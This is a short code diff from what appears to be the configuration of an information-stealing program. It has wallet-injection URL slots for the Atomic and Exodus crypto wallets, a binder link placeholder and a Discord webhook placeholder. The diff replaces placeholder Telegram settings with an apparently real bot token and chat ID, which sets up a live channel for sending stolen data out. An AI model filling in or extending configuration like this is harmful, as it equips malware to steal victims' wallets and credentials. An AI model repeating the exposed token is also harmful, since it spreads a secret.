@@ -25,8 +25,8 @@ const atomicInjectionUrl = "";
 const exodusInjectionUrl = "";
 
 const url = 'BINDER-LINK-HERE';
-const botToken = 'YOURBOTTOKEN';
-const chatId = 'YOURCHATID';
+const botToken = '7868379555:AAG2t1skh8VMU12InUTYFaTuwFLV-Lx7aFU';
+const chatId = '1877697942';
 const discordWebhookUrl = 'REMPLACE_ME';
 
 
